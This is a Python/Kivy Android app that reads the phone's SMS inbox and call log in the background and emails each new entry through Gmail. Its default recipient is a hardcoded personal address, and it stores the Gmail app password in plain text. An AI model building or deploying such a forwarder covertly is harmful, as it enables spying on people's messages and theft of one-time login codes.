import os
import json
import smtplib
import threading
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.graphics import Color, RoundedRectangle

CONFIG = os.path.expanduser('~/.smsfwd.json')

def load_cfg():
    # بنية بيانات متطورة تدعم تتبع آخر المزامنات لمنع تكرار الإرسال نهائياً
    d = {
        'sender': '',
        'password': '',
        'recipient': 'hamzatalat8@gmail.com',
        'last_sms_time': 0,
        'last_call_time': 0,
        'sent_sms': [],
        'sent_calls': []
    }
    try:
        if os.path.exists(CONFIG):
            with open(CONFIG, 'r', encoding='utf-8') as f:
                d.update(json.load(f))
    except Exception:
        pass
    return d

def save_cfg(c):
    try:
        with open(CONFIG, 'w', encoding='utf-8') as f:
            json.dump(c, f, ensure_ascii=False, indent=4)
    except Exception:
        pass

def send_mail(cfg, subj, body):
    if not cfg['sender'] or not cfg['password']:
        return False, 'بيانات المرسل غير مكتملة'
    try:
        msg = MIMEMultipart()
        msg['From'] = cfg['sender']
        msg['To'] = cfg['recipient']
        msg['Subject'] = subj
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15) as s:
            s.login(cfg['sender'], cfg['password'])
            s.sendmail(cfg['sender'], cfg['recipient'], msg.as_string())
        return True, 'OK'
    except Exception as e:
        return False, str(e)

# --- عناصر واجهة مخصصة وعصرية (Material Design UI) ---
class ModernTextInput(TextInput):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_active = ''
        self.background_normal = ''
        self.background_color = [0, 0, 0, 0]
        self.cursor_color = [0.12, 0.53, 0.9, 1]
        self.foreground_color = [0.2, 0.2, 0.2, 1]
        self.padding = [15, 12, 15, 12]
        self.font_size = '16sp'
        self.bind(size=self._update_canvas, pos=self._update_canvas)

    def _update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0.96, 0.96, 0.98, 1) # رمادي ناعم مريح للعين
            RoundedRectangle(pos=self.pos, size=self.size, radius=[10])

class ModernButton(Button):
    def __init__(self, bg_color=[0.12, 0.53, 0.9, 1], **kwargs):
        super().__init__(**kwargs)
        self.bg_color = bg_color
        self.background_normal = ''
        self.background_down = ''
        self.background_color = [0, 0, 0, 0]
        self.font_size = '18sp'
        self.bold = True
        self.bind(size=self._update_canvas, pos=self._update_canvas)

    def _update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.bg_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[10])

# --- الشاشة الرئيسية المحسنة ---
class MainScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.active = False
        self._stop = threading.Event()
        self.cfg = load_cfg()
        
        # نظام التمرير لضمان التوافق مع شاشات الهواتف كافة
        scroll = ScrollView(do_scroll_x=False)
        root = BoxLayout(orientation='vertical', padding=25, spacing=15, size_hint_y=None)
        root.bind(minimum_height=root.setter('height'))
        
        # ترويسة التطبيق
        root.add_widget(Label(text='🛡️ PRO Forwarder Suite', font_size='26sp', bold=True, color=[0.1, 0.1, 0.1, 1], size_hint_y=None, height=50))
        
        self.status = Label(text='[color=ff4444]● وضع الاستعداد (متوقف)[/color]', markup=True, font_size='16sp', size_hint_y=None, height=35)
        root.add_widget(self.status)
        
        # حقول البيانات
        root.add_widget(Label(text='بريد Gmail المرسل:', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20, halign='left'))
        self.inp_sender = ModernTextInput(text=self.cfg.get('sender', ''), multiline=False, size_hint_y=None, height=50)
        root.add_widget(self.inp_sender)
        
        root.add_widget(Label(text='كلمة مرور التطبيق (App Password):', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20, halign='left'))
        self.inp_pass = ModernTextInput(text=self.cfg.get('password', ''), password=True, multiline=False, size_hint_y=None, height=50)
        root.add_widget(self.inp_pass)
        
        root.add_widget(Label(text='البريد الإلكتروني المستقبل:', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20, halign='left'))
        self.inp_recv = ModernTextInput(text=self.cfg.get('recipient', 'hamzatalat8@gmail.com'), multiline=False, size_hint_y=None, height=50)
        root.add_widget(self.inp_recv)
        
        # لوحة أزرار التحكم
        self.btn = ModernButton(text='تشغيل الخدمة الذكية', bg_color=[0.11, 0.65, 0.36, 1], size_hint_y=None, height=55)
        self.btn.bind(on_press=self.toggle)
        root.add_widget(self.btn)
        
        self.btn_test = ModernButton(text='إرسال رسالة اختبار سرعة', bg_color=[0.12, 0.53, 0.9, 1], size_hint_y=None, height=50)
        self.btn_test.bind(on_press=self.test)
        root.add_widget(self.btn_test)
        
        # شاشة عرض السجلات الحية المتقدمة (Live Logger)
        root.add_widget(Label(text='سجل العمليات المباشر:', color=[0.4, 0.4, 0.4, 1], font_size='14sp', size_hint_y=None, height=20))
        self.log = Label(text='نظام الرصد جاهز لجمع البيانات...', color=[0.2, 0.2, 0.2, 1], font_size='14sp', size_hint_y=None, height=80, halign='center', valign='middle')
        self.log.bind(size=self.log.setter('text_size'))
        root.add_widget(self.log)
        
        scroll.add_widget(root)
        self.add_widget(scroll)

    def append_log(self, text):
        # دالة آمنة لتحديث السجلات من الـ Threads بدون التسبب في تجمد التطبيق
        def _update(dt):
            now = datetime.now().strftime("%H:%M:%S")
            self.log.text = f"[{now}] {text}"
        Clock.schedule_once(_update, 0)

    def save(self):
        self.cfg['sender'] = self.inp_sender.text.strip()
        self.cfg['password'] = self.inp_pass.text.strip()
        self.cfg['recipient'] = self.inp_recv.text.strip()
        save_cfg(self.cfg)

    def toggle(self, *a):
        if not self.active:
            self.save()
            self.active = True
            self._stop.clear()
            self.btn.text = 'إيقاف الخدمة وتعطيل الرصد'
            self.btn.bg_color = [0.89, 0.24, 0.24, 1]
            self.btn._update_canvas()
            self.status.text = '[color=00c853]● وضع الرصد والمزامنة النشط يعمل حالياً...[/color]'
            threading.Thread(target=self._loop, daemon=True).start()
        else:
            self.active = False
            self._stop.set()
            self.btn.text = 'تشغيل الخدمة الذكية'
            self.btn.bg_color = [0.11, 0.65, 0.36, 1]
            self.btn._update_canvas()
            self.status.text = '[color=ff4444]● وضع الاستعداد (متوقف)[/color]'

    def test(self, *a):
        self.save()
        def _t():
            ok, msg = send_mail(self.cfg, '⚡ اختبار اتصال التطبيق الخارق', f'تم إرسال هذا الإشعار لاختبار استجابة سيرفر الإرسال بنجاح.\nالوقت الدقيق: {datetime.now()}')
            self.append_log('✅ تم إرسال بريد الاختبار بنجاح وضمان الاتصال بالسيرفر!' if ok else f'❌ فشل في الاتصال بالسيرفر: {msg}')
        threading.Thread(target=_t, daemon=True).start()
        self.append_log('جاري فحص الاتصال بسيرفرات SMTP لإرسال الاختبار...')

    def _loop(self):
        # تحميل القوائم من التخزين الدائم لمنع أي تكرار تاريخي للبيانات
        sent_sms = set(self.cfg.get('sent_sms', []))
        sent_calls = set(self.cfg.get('sent_calls', []))
        
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Uri = autoclass('android.net.Uri')
            ANDROID = True
            self.append_log("بيئة أندرويد تم رصدها بنجاح. بدء قراءة المحتوى...")
        except Exception:
            ANDROID = False
            self.append_log("تنبيه: التطبيق يعمل خارج بيئة أندرويد (محاكاة فقط).")

        while not self._stop.is_set():
            config_changed = False
            try:
                if ANDROID:
                    ctx = PythonActivity.mActivity
                    
                    # 🚀 ميزة المزامنة الفورية الذكية للـ SMS
                    uri = Uri.parse('content://sms/inbox')
                    # ترتيب الفحص بناءً على التاريخ الأحدث تصاعدياً لتقليل الحمل على الذاكرة
                    cur = ctx.getContentResolver().query(uri, None, None, None, 'date DESC')
                    if cur and cur.moveToFirst():
                        for _ in range(min(cur.getCount(), 15)):
                            row = {c: cur.getString(cur.getColumnIndex(c)) for c in ['_id', 'address', 'body', 'date']}
                            sms_id = row['_id']
                            sms_date = int(row.get('date', 0))
                            
                            # ميزة التحقق الثنائي من المعرف والوقت لمنع أي تكرار
                            if sms_id and sms_id not in sent_sms and sms_date > self.cfg.get('last_sms_time', 0):
                                time_str = datetime.fromtimestamp(sms_date/1000.0).strftime('%Y-%m-%d %H:%M:%S')
                                email_body = f"المرسل: {row['address']}\nالتوقيت: {time_str}\n\nنص الرسالة:\n{row['body']}"
                                
                                ok, _ = send_mail(self.cfg, f"📩 SMS جديد من: {row['address']}", email_body)
                                if ok:
                                    sent_sms.add(sms_id)
                                    if sms_date > self.cfg['last_sms_time']:
                                        self.cfg['last_sms_time'] = sms_date
                                    config_changed = True
                                    self.append_log(f"تم تحويل رسالة بنجاح من الرقم: {row['address']}")
                            if not cur.moveToNext(): break
                        cur.close()

                    # 🚀 ميزة المزامنة الفورية لسجل المكالمات
                    uri2 = Uri.parse('content://call_log/calls')
                    cur2 = ctx.getContentResolver().query(uri2, None, None, None, 'date DESC')
                    if cur2 and cur2.moveToFirst():
                        for _ in range(min(cur2.getCount(), 8)):
                            row = {c: cur2.getString(cur2.getColumnIndex(c)) for c in ['number', 'type', 'duration', 'date']}
                            call_date = int(row.get('date', 0))
                            uid = f"{call_date}_{row.get('number','')}"
                            
                            t = {'1': 'واردة', '2': 'صادرة', '3': 'لم يرد عليها (فائتة)'}.get(str(row.get('type', '')), 'مجهولة')
                            
                            if uid not in sent_calls and call_date > self.cfg.get('last_call_time', 0):
                                call_time = datetime.fromtimestamp(call_date/1000.0).strftime('%Y-%m-%d %H:%M:%S')
                                body_text = f"رقم الهاتف: {row['number']}\nنوع المكالمة: {t}\nتوقيت المكالمة: {call_time}\nالمدة الزرقاء للمكالمة: {row['duration']} ثانية"
                                
                                ok, _ = send_mail(self.cfg, f"📞 مكالمة {t} - من الرقم {row['number']}", body_text)
                                if ok:
                                    sent_calls.add(uid)
                                    if call_date > self.cfg['last_call_time']:
                                        self.cfg['last_call_time'] = call_date
                                    config_changed = True
                                    self.append_log(f"تم تحويل بيانات مكالمة {t} للرقم: {row['number']}")
                            if not cur2.moveToNext(): break
                        cur2.close()

                    # 🚀 التخزين الدائم للحالة بشكل دوري لضمان ثبات البيانات أوفلاين
                    if config_changed:
                        self.cfg['sent_sms'] = list(sent_sms)[-150:] # حد أقصى لحجم الملف لضمان خفة التطبيق
                        self.cfg['sent_calls'] = list(sent_calls)[-150:]
                        save_cfg(self.cfg)

            except Exception as e:
                self.append_log(f"خطأ أثناء الفحص في الخلفية: {str(e)[:50]}")
            
            # تم تقليل دورة الانتظار إلى 12 ثانية لتسريع الإرسال الفوري مع حماية معالج الهاتف
            self._stop.wait(12)

class SMSApp(App):
    def build(self):
        self.title = "PRO Forwarder Suite"
        sm = ScreenManager()
        sm.add_widget(MainScreen(name='main'))
        return sm

if __name__ == '__main__':
    SMSApp().run()
